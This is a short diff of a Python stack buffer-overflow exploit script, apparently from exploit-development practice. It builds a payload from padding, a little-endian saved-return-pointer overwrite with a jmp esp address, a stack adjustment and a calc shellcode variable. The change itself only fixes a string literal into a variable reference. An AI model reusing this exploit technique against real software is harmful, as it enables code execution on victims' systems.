@@ -40,7 +40,7 @@ buf = ""
 buf += "A"*(offset_srp - len(buf)) #padding
 buf += struct.pack("<I",ptr_jmp_esp) #SRP overwrite using struct pack that does little endian work for me
 buf += sub_esp_10 #ESP  points here
-buf += "shellcode_calc"
+buf += shellcode_calc
 buf += "C"*(buf_totlen - len(buf)) #trailing padding
 buf += "\n"
 
